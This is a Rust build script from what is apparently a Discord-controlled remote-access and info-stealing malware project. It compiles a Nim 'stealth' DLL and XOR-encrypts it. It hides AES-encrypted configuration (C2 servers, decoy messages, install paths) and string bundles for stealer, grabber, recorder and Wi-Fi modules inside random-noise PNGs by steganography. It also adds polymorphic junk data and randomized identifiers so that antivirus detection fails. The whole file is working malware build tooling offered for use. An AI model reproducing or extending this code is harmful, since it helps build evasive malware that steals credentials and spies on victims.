use std::env;
use std::fs;
use std::path::Path;
use image::{RgbaImage, Rgba, ImageFormat};
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit};
use aes_gcm::aead::Aead;
use rand::{Rng, RngCore, SeedableRng};
use std::collections::HashMap;
use serde_json;
use sha2::{Sha256, Digest};
use hmac::{Hmac, Mac};
type HmacSha256b = Hmac<Sha256>;

/// Per-build unique master key: SHA-256(random_bytes || build_uuid || timestamp)
/// Each cargo build generates fresh randomness AND mixes in a UUID that is either
/// provided via BUILD_UUID env var (for reproducible builds) or randomly generated.
fn generate_stego_key() -> [u8; 32] {
    let mut rng = rand::thread_rng();
    let mut base = [0u8; 32];
    rng.fill_bytes(&mut base);

    // Build-time UUID / extra entropy — differs per build invocation
    let build_uuid = std::env::var("BUILD_UUID").unwrap_or_else(|_| {
        // Generate a random UUID-like string each build
        let mut uuid_bytes = [0u8; 16];
        rng.fill_bytes(&mut uuid_bytes);
        hex::encode(uuid_bytes)
    });

    // Build timestamp for additional uniqueness
    let build_ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);

    // Mix: SHA-256(base || uuid || timestamp)
    let mut hasher = Sha256::new();
    hasher.update(&base);
    hasher.update(build_uuid.as_bytes());
    hasher.update(&build_ts.to_le_bytes());
    let result = hasher.finalize();

    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

fn derive_aes_key(raw_key: &[u8; 32], mask: &[u8; 32]) -> [u8; 32] {
    let mut mac = <HmacSha256b as Mac>::new_from_slice(mask).expect("hmac");
    mac.update(raw_key);
    let prk = mac.finalize().into_bytes();

    let mut mac2 = <HmacSha256b as Mac>::new_from_slice(&prk).expect("hmac");
    mac2.update(b"stego-v2\x01");
    let okm = mac2.finalize().into_bytes();

    let mut out = [0u8; 32];
    out.copy_from_slice(&okm);
    out
}

fn derive_nonce(raw_key: &[u8; 32], name: &str) -> [u8; 12] {
    let mut mac = <HmacSha256b as Mac>::new_from_slice(raw_key).expect("hmac");
    mac.update(name.as_bytes());
    let h = mac.finalize().into_bytes();
    let mut nonce = [0u8; 12];
    nonce.copy_from_slice(&h[..12]);
    nonce
}

fn encode_to_bits(data: &[u8]) -> Vec<u8> {
    let mut bits = Vec::new();
    for &b in data {
        for i in (0..8).rev() {
            bits.push((b >> i) & 1);
        }
    }
    bits
}

fn encrypt_and_embed_bundle(data_map: &HashMap<String, String>, name: &str, out_dir: &std::ffi::OsStr, master_key: &[u8; 32], mask: &[u8; 32]) -> String {
    let json_data = serde_json::to_string(data_map).expect("JSON serialize failed");

    // HKDF → AES key (identical to runtime)
    let aes_key_bytes = derive_aes_key(master_key, mask);
    // Nonce: HMAC-SHA256(raw_key, bundle_name)[..12]
    let nonce_bytes = derive_nonce(master_key, name);

    let key  = Key::<Aes256Gcm>::from_slice(&aes_key_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let cipher = Aes256Gcm::new(key);
    let encrypted = cipher.encrypt(nonce, json_data.as_bytes()).expect("Enc failed");
    let bits = encode_to_bits(&encrypted);

    // 픽셀 수: 3비트/픽셀 (R+G+B LSB)
    let need_bits = bits.len();
    let need_pixels = (need_bits + 2) / 3;

    // 이미지 크기: need_pixels를 담을 수 있는 정사각형, 최소 64×64
    let side = ((need_pixels as f64).sqrt().ceil() as u32).max(64);
    let total_pixels = (side * side) as usize;

    // 완전 랜덤 배경 (0-255 균등분포 → 히스토그램 완전 플랫)
    let mut img = RgbaImage::new(side, side);
    let mut fill_rng = rand::thread_rng();
    for y in 0..side {
        for x in 0..side {
            img.put_pixel(x, y, Rgba([
                fill_rng.gen::<u8>(),
                fill_rng.gen::<u8>(),
                fill_rng.gen::<u8>(),
                255,
            ]));
        }
    }

    // PRNG 픽셀 선택: SHA-256(aes_key || bundle_name) → 카테고리별 고유 픽셀 순서
    // 같은 AES 키라도 번들 이름이 다르면 완전히 다른 픽셀 순서가 생성됨
    {
        let mut seed_hasher = Sha256::new();
        seed_hasher.update(&aes_key_bytes);
        seed_hasher.update(name.as_bytes()); // category salt!
        let seed_hash = seed_hasher.finalize();
        let mut seed = [0u8; 32];
        seed.copy_from_slice(&seed_hash);
        let mut pixel_rng = rand::rngs::StdRng::from_seed(seed);

        let limit = need_pixels.min(total_pixels);
        let mut indices: Vec<u32> = (0..total_pixels as u32).collect();
        for i in 0..limit {
            let j = pixel_rng.gen_range(i..total_pixels);
            indices.swap(i, j);
        }

        // R+G+B LSB 임베딩 — 3비트/픽셀
        let mut bit_idx = 0usize;
        for &idx in &indices[..limit] {
            if bit_idx >= need_bits { break; }
            let x = idx % side;
            let y = idx / side;
            let px = *img.get_pixel(x, y);
            let r = (px[0] & 0xFE) | bits[bit_idx]; bit_idx += 1;
            let g = if bit_idx < need_bits { (px[1] & 0xFE) | bits[bit_idx] } else { px[1] };
            if bit_idx < need_bits { bit_idx += 1; }
            let b = if bit_idx < need_bits { (px[2] & 0xFE) | bits[bit_idx] } else { px[2] };
            if bit_idx < need_bits { bit_idx += 1; }
            img.put_pixel(x, y, Rgba([r, g, b, px[3]]));
        }
    }

    let img_path = Path::new(out_dir).join(format!("{}.png", name));
    img.save_with_format(&img_path, ImageFormat::Png).unwrap();

    let path_str = img_path.display().to_string().replace("\\", "/");

    format!(
        "pub const PNG_{}: &[u8] = include_bytes!(r#\"{}\"#);\n\
         pub const NONCE_{}: [u8; 12] = {:?};\n\
         pub const LEN_{}: usize = {};\n",
        name, path_str, name, nonce_bytes, name, encrypted.len()
    )
}

fn build_nim_stealth() {
    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
    let root_dir = Path::new(&manifest_dir).parent().unwrap();
    let nim_source = root_dir.join("nim_stealth").join("libstealth.nim");
    let output_dll = Path::new(&manifest_dir).join("stealth.dll");
    let output_bin = Path::new(&manifest_dir).join("stealth.bin");

    // Tell cargo to rerun if ANY Nim source changes
    if let Ok(entries) = fs::read_dir(root_dir.join("nim_stealth")) {
        for entry in entries.flatten() {
            if entry.path().extension().map_or(false, |ext| ext == "nim") {
                println!("cargo:rerun-if-changed={}", entry.path().display());
            }
        }
    }
    
    // 1. Compile Nim DLL
    // Command: nim c -d:release --app:lib --nomain --cpu:amd64 --opt:size --out:stealth.dll libstealth.nim
    let status = std::process::Command::new("nim")
        .args(&[
            "c",
            "-d:release",
            "--app:lib",
            "--cpu:amd64",
            "--opt:size",
             // Force static linking so DLL works on VMs without MinGW libs
            "--passL:-static",
            "--passL:-static-libgcc", 
            &format!("--out:{}", output_dll.display()),
            nim_source.to_str().unwrap()
        ])
        .output();

    match status {
        Ok(s) => {
            if !s.status.success() {
                use std::io::Write;
                std::io::stderr().write_all(&s.stderr).unwrap();
                println!("cargo:warning=Nim compilation failed. Make sure Nim is installed and in PATH.");
            } else {
                println!("cargo:warning=Nim Stealth DLL compiled successfully.");
                
                // 2. XOR Encrypt to stealth.bin (Key 0xAA)
                // Need to locate the DLL. It might be in the root directory or where --out pointed.
                // We specified absolute path for --out, so it should be there.
                
                if output_dll.exists() {
                     let dll_content = fs::read(&output_dll).expect("Failed to read compiled stealth.dll");
                     let mut bin_content = dll_content.clone();
                     
                     for byte in bin_content.iter_mut() {
                         *byte ^= 0xAA;
                     }

                     fs::write(&output_bin, bin_content).expect("Failed to write stealth.bin");
                     println!("cargo:warning=Generated stealth.bin from Nim DLL ({} bytes)", dll_content.len());
                } else {
                     println!("cargo:warning=stealth.dll not found at expected path: {}", output_dll.display());
                }
            }
        },
        Err(e) => {
            println!("cargo:warning=Failed to execute Nim compiler: {}", e);
        }
    }
}

fn main() {
    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("generated_stego_bundle.rs");

    // 0. Build Nim Stealth Engine
    build_nim_stealth();

    let master_key = generate_stego_key();

    let mut res = winresource::WindowsResource::new();
    // Try to find icon
    if Path::new("assets/setting.ico").exists() {
        res.set_icon("assets/setting.ico"); 
    }
    res.set_version_info(winresource::VersionInfo::FILEVERSION, 0x000A0000585D17F5);
    res.set_version_info(winresource::VersionInfo::PRODUCTVERSION, 0x000A0000585D17F5);
    res.compile().ok();

    let mut rng = rand::thread_rng();
    
    // 1. Handle Settings (Config)
    let settings_path = Path::new("src/settings.rs");
    let mut config_map = HashMap::new();
    if settings_path.exists() {
        if let Ok(content) = fs::read_to_string(settings_path) {
            for line in content.lines() {
                if line.contains("pub const") && line.contains(": &str =") {
                    let parts: Vec<&str> = line.split(": &str =").collect();
                    if parts.len() == 2 {
                        let key = parts[0].replace("pub const", "").trim().to_string();
                        let val = parts[1].trim().trim_matches(';').trim_matches('"').to_string();
                        config_map.insert(key, val);
                    }
                }
            }
        }
    }
    
    let mut generated = String::from("// Ultra Stealth Assets Bundle - Polymorphic Key Engine\n\n");
    
    // Obfuscate the master key with a random XOR mask per build
    let mut xor_mask = [0u8; 32];
    rng.fill_bytes(&mut xor_mask);
    let mut obfuscated_key = master_key;
    for i in 0..32 { obfuscated_key[i] ^= xor_mask[i]; }

    generated.push_str(&format!("pub const STEGO_K: [u8; 32] = {:?};\n", obfuscated_key));
    generated.push_str(&format!("pub const STEGO_M: [u8; 32] = {:?};\n\n", xor_mask));

    // ADD POLYMORPHIC JUNK DATA
    let junk_count = rng.gen_range(5..12);
    let mut junk_use_fn = String::from("pub fn use_junk() {\n");
    for i in 0..junk_count {
        let junk_size = rng.gen_range(4096..16384);
        let mut junk_data = vec![0u8; junk_size];
        rng.fill_bytes(&mut junk_data);
        generated.push_str(&format!("pub const JUNK_DATA_{}: &[u8] = &{:?};\n", i, junk_data));
        junk_use_fn.push_str(&format!("    let _ = JUNK_DATA_{}.len();\n", i));
    }
    junk_use_fn.push_str("}\n");
    generated.push_str(&junk_use_fn);
    
    generated.push_str("pub const JUNK_DATA: &[u8] = JUNK_DATA_0;\n");

    generated.push_str(&encrypt_and_embed_bundle(&config_map, "CONFIG", &out_dir, &master_key, &xor_mask));

    // 2. Handle Group Strings — use Value-based parsing to surface errors
    let strings_json_path = Path::new("stego_strings.json");
    if strings_json_path.exists() {
        match fs::read_to_string(strings_json_path) {
            Ok(strings_content) => {
                // Strip UTF-8 BOM if present (\xEF\xBB\xBF)
                let s = strings_content.strip_prefix('\u{FEFF}').unwrap_or(&strings_content);
                match serde_json::from_str::<serde_json::Value>(s) {
                    Ok(root) => {
                        if let Some(obj) = root.as_object() {
                            for (cat_name, cat_val) in obj {
                                if let Some(inner) = cat_val.as_object() {
                                    // Convert Value entries to String, coercing non-strings to their JSON repr
                                    let map: HashMap<String, String> = inner.iter().map(|(k, v)| {
                                        let s = match v {
                                            serde_json::Value::String(s) => s.clone(),
                                            other => other.to_string(),
                                        };
                                        (k.clone(), s)
                                    }).collect();
                                    generated.push_str(&encrypt_and_embed_bundle(&map, cat_name, &out_dir, &master_key, &xor_mask));
                                } else {
                                    println!("cargo:warning=stego: category '{}' is not an object, skipping", cat_name);
                                }
                            }
                        }
                    }
                    Err(e) => println!("cargo:warning=stego: JSON parse error: {}", e),
                }
            }
            Err(e) => println!("cargo:warning=stego: cannot read stego_strings.json: {}", e),
        }
    }

    // 3. Generate Randomized Storage Identifiers for http_client
    let mut storage_gen = String::from("// Randomized Storage Buffers\n\n");
    // No `use` here — http_client.rs already imports OnceLock and Mutex
    
    let mut gen_id = |len: usize| -> String {
        let mut id = String::from("_");
        let chars: Vec<char> = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".chars().collect();
        for _ in 0..len { id.push(chars[rng.gen_range(0..chars.len())]); }
        id
    };

    let id_e = gen_id(12);
    let id_s = gen_id(12);
    let id_i = gen_id(12);

    storage_gen.push_str(&format!("static {}: OnceLock<[u8; 32]> = OnceLock::new();\n", id_e));
    storage_gen.push_str(&format!("static {}: Mutex<Option<String>> = Mutex::new(None);\n", id_s));
    storage_gen.push_str(&format!("static {}: Mutex<usize> = Mutex::new(0);\n\n", id_i));

    storage_gen.push_str(&format!("pub fn get_buf_e() -> &'static OnceLock<[u8; 32]> {{ &{} }}\n", id_e));
    storage_gen.push_str(&format!("pub fn get_buf_s() -> &'static Mutex<Option<String>> {{ &{} }}\n", id_s));
    storage_gen.push_str(&format!("pub fn get_buf_i() -> &'static Mutex<usize> {{ &{} }}\n", id_i));

    let storage_path = Path::new(&out_dir).join("generated_http_storage.rs");
    fs::write(&storage_path, storage_gen).unwrap();

    // 4. Generate key-index map: no plaintext key names in binary
    // Each (category_code, key_name) pair -> random u32 index constant
    // XOR mask for key bytes: chosen randomly per build
    let key_xor: u8 = rng.gen_range(0x01u8..=0xFEu8);
    let mut key_map_gen = String::from("// Key index map - auto-generated, do not edit\n\n");
    key_map_gen.push_str(&format!("pub const KEY_XOR: u8 = {};\n", key_xor));

    // Collect all (cat_code, key_name) pairs
    let mut all_pairs: Vec<(String, String)> = Vec::new();

    // From settings.rs
    let cat_codes: &[(&str, &str)] = &[
        ("A6", "C2_PRIMARY"), ("A6", "C2_BACKUP"), ("A6", "SHARED_SECRET"),
        ("A6", "GUILD_ID"), ("A6", "TASK_NAME"), ("A6", "EXE_NAME"),
        ("A6", "INSTALL_SUBDIR"), ("A6", "BOT_PREFIX"), ("A6", "SCREEN_SHARE_WORKER_URL"),
        ("A6", "GLOBAL_CHANNEL_ID"), ("A6", "DECOY_TITLE"), ("A6", "DECOY_MESSAGE"),
        ("A6", "PRODUCT_NAME"), ("A6", "PRODUCT_DESC"), ("A6", "COMPANY_NAME"),
        ("A6", "FILE_VERSION"),
    ];
    for (cat, key) in cat_codes {
        all_pairs.push((cat.to_string(), key.to_string()));
    }

    // From stego_strings.json - collect all keys
    let strings_json_path2 = Path::new("stego_strings.json");
    let cat_code_map: HashMap<&str, &str> = [
        ("CORE","A1"),("FS","A2"),("SYS","A3"),("NET","A4"),("UTIL","A5"),
        ("CONFIG","A6"),("SCRIPTS","A7"),("DESC","A8"),("CONST","A9"),
        ("LOG","B1"),("WIN","B2"),("CMD_META","B3"),("MSG","B4"),
        ("WIFI","B5"),("STEALER","B6"),("URL","B7"),
        ("GRABBER","B8"),("RECORDER","B9"),
    ].iter().cloned().collect();

    if strings_json_path2.exists() {
        if let Ok(c) = fs::read_to_string(strings_json_path2) {
            let c = c.strip_prefix('\u{FEFF}').unwrap_or(&c).to_string();
            if let Ok(root) = serde_json::from_str::<serde_json::Value>(&c) {
                if let Some(obj) = root.as_object() {
                    for (cat_name, cat_val) in obj {
                        if let Some(&code) = cat_code_map.get(cat_name.as_str()) {
                            if let Some(inner) = cat_val.as_object() {
                                for key in inner.keys() {
                                    if !all_pairs.iter().any(|(c2, k2)| c2 == code && k2 == key) {
                                        all_pairs.push((code.to_string(), key.to_string()));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Assign random u32 index to each pair, generate const + encoded bytes
    let mut used_indices: std::collections::HashSet<u32> = std::collections::HashSet::new();
    let mut const_lines = String::new();
    let mut lookup_entries = String::new(); // (idx, cat_code_xored, key_xored)

    for (cat_code, key_name) in &all_pairs {
        // unique random index
        let mut idx: u32 = rng.gen();
        while used_indices.contains(&idx) { idx = rng.gen(); }
        used_indices.insert(idx);

        // XOR-encode cat_code bytes
        let cat_xored: Vec<u8> = cat_code.bytes().map(|b| b ^ key_xor).collect();
        // XOR-encode key_name bytes
        let key_xored: Vec<u8> = key_name.bytes().map(|b| b ^ key_xor).collect();

        // Const name = CAT_KEY (category prefix prevents duplicate names across categories)
        let const_name = format!("{}_{}", cat_code.replace('-', "_"), key_name);
        const_lines.push_str(&format!("pub const {}: u32 = {};\n", const_name, idx));

        lookup_entries.push_str(&format!(
            "    ({}, &{:?}, &{:?}),\n",
            idx, cat_xored, key_xored
        ));
    }

    key_map_gen.push_str(&const_lines);
    key_map_gen.push_str("\n");
    key_map_gen.push_str("pub static KEY_TABLE: &[(u32, &[u8], &[u8])] = &[\n");
    key_map_gen.push_str(&lookup_entries);
    key_map_gen.push_str("];\n");

    let key_map_path = Path::new(&out_dir).join("generated_key_map.rs");
    fs::write(&key_map_path, key_map_gen).unwrap();

    fs::write(&dest_path, generated).unwrap();

    println!("cargo:rerun-if-changed=src/settings.rs");
    println!("cargo:rerun-if-changed=stego_strings.json");
    println!("cargo:rerun-if-changed=build.rs");
}
